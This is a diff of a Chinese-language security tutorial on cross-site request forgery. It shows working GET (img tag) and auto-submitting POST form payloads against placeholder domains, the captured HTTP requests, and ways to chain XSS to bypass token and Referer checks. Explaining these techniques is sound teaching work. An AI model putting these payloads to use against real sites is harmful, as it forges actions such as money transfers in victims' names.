@@ -11,34 +11,51 @@ CSRF通过构造get/post等请求，设法使已登录用户victim不知情的�
 * CSRF局限性:如果只有单一的CSRF漏洞，攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
 * CSRF扩展性:可联合其他漏洞(如XSS)进行攻击效果最大化
 
-### CSRF类型与利用方式
+### CSRF类型
 
-* CSRF类型
-  * GET - 利用方式 使victim点击构造的url 发出GET请求 `http://get.csrf.com/payto?name=hacker&moneynumb=100`
+* CSRF类型 按method分
+  * GET - 利用方式 使victim点击构造的url 发出GET请求 `http://get.csrfvul.com/payto?name=hacker&moneynumb=100`
   * POST - 利用方式 尝试转变为GET (可尝试将post请求体改成get形式放至url参数中 如果可以正常响应 则可以使用GET请求进行csrf攻击)
-* 漏洞联合 - 使用XSS绕过CSRF保护机制 无交互地利用CSRF漏洞
-   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制为后端判断CSRFtoken的值，使用JavaScript找到CSRFtoken参数值并构造出"合法的"GET/POST请求 全程不存在跨域问题
+
+### 利用CSRF实现攻击
+
+* 漏洞联合 - 使用XSS可绕过CSRF保护机制 无交互地利用CSRF漏洞 有以下场景:
+   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 很多anti-CSRF机制原理是判断HTTP请求中的CSRFtoken的值，当只存在XSS漏洞时，可使用JavaScript找到csrf-token参数值(需要看csrf-token的具体位置)，并构造出携带csrf-toekn的HTTP请求 可通过后端对csrf-token的验证 实现CSRF攻击
    * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
-   * 3.利用任意第三方域名的XSS漏洞 - 使victim访问攻击者可控的第三方网站`https://3.com` 该第三方站点上用javascript构造GET请求(通过img标签 使victim发出GET请求) POST请求(构造目标站的表单数据并自动提交 使victim发出POST请求)
-   * html注入漏洞 (参考通过XSS间接利用CSRF)
+   * 如果有html注入漏洞 也是同理
+
+|csrf-token位置|获取方法|描述|
+|:---:|---|-------|
+|html代码form表单|略||
+|cookie|略|注意如果是HTTP-only的cookie就难以获取|
+
+
 * 漏洞联合 - CSRF漏洞 可使self-XSS漏洞"变废为宝"
-  * 利用过程 - 假设b.com下存在self-XSS漏洞和CSRF漏洞，直接利用self-XSS漏洞则victim只有自己，但是借助CSRF漏洞则victim可以是别人，比如可在攻击者可控的第三方网站`https://3.com`下利用CSRF漏洞 构造跨域请求发送到b.com，其中请求内容为"能够触发self-XSS漏洞的payload"，所以victim访问第三方网站`https://3.com`时，会发出CSRF请求到b.com并且在域b.com下被XSS攻击
+  * 场景 - `vul.com`存在self-XSS漏洞和CSRF漏洞，而直接利用self-XSS漏洞则victim只能是自己，如何实现self-XSS去攻击自己以外的目标?
+  * 目标 - 通过借助CSRF漏洞，使XSSpayload能够攻击自己以外的目标
+  * 过程 - 可在攻击者可控的第三方网站`https://3.com`下利用`vul.com`的CSRF漏洞:通过多种方法(如JavaScript)都可以构造出跨域HTTP请求发送到`vul.com`，其中RequestBody的内容包含了"能够触发self-XSS漏洞的payload"，所以当victim访问第三方网站`https://3.com`时，会发出CSRF请求到`vul.com`，则该用户在`vul.com`域下被XSS攻击
 
-#### 利用任意第三方域名的XSS漏洞 发出GET请求
 
-通过javascript 在 http://www.3.com/demo 中注入以下html代码:
+#### 利用CSRF漏洞发出GET请求
+
+* 场景
+  * 攻击者可控的第三方域:`www.3.com`会被victim访问
+  * 目标域存在CSRF漏洞
+
+通过多种办法(如JavaScript) 在 `http://www.3.com/demo` 中注入代码:
 ```
-<img src="http://get.csrf.com/payto?name=hacker&moneynumb=100">
+<img src="http://get.csrfvul.com/payto?name=hacker&moneynumb=100">
 ```
 
-victim访问http://www.3.com/demo 则发出GET请求
+victim访问`http://www.3.com/demo` 则会发出GET请求到`get.csrfvul.com`
 
 
-get.csrf.com收到GET请求:
-请求中的Referer头说明了该get请求是从第三方url发起的 (如果后端验证Referer的值 则CSRF利用失败)
+`get.csrfvul.com`收到了这个GET请求:
+
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
 ```
 GET /payto?name=hacker&moneynumb=100 HTTP/1.1
-Host: get.csrf.com
+Host: get.csrfvul.com
 Connection: keep-alive
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 Accept: image/webp,image/apng,image/*,*/*;q=0.8
@@ -46,13 +63,18 @@ Referer: http://www.3.com/demo
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 ```
-       
-#### 利用任意第三方域名的XSS漏洞 发出POST请求
 
-通过javascript 在 https://3.com 中注入以下html代码:
+#### 利用可控的第三方域 实现CSRF发出POST请求
+
+* 场景
+  * 攻击者可控的第三方域:`www.3.com`会被victim访问
+  * 目标域存在CSRF漏洞
+
+通过多种办法(如JavaScript) 在 `https://www.3.com/demo` 中注入代码:
+
 ```
   <script>history.pushState('', '', '/')</script>
-    <form name="frm" action="https://post.csrf.com/search" method="POST">
+    <form name="frm" action="https://post.csrfvul.com/search" method="POST">
       <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
       <input type="hidden" name="offset" value="0" />
       <input type="hidden" name="limit" value="20" />
@@ -61,18 +83,12 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 <script>document.frm.submit()</script>
 ```
 
-victim访问https://3.com 则发出POST请求
+victim访问 `https://3.com/demo` 则会发出POST请求到`post.csrfvul.com`
 
-
-post.csrf.com收到POST请求:并可看出HTTP请求从哪里发起
-```
-Origin: https://3.com
-Referer: https://3.com/
-```
-
+`post.csrfvul.com`收到了这个POST请求:
 ```
 POST /search HTTP/1.1
-Host: post.csrf.com
+Host: post.csrfvul.com
 Connection: keep-alive
 Content-Length: 28
 Cache-Control: max-age=0
@@ -87,6 +103,13 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
 ip=1.1.1.1&offset=0&limit=20
 ```
+
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
+```
+Origin: https://3.com
+Referer: https://3.com/
+```
+
 
 ### 漏洞影响
 
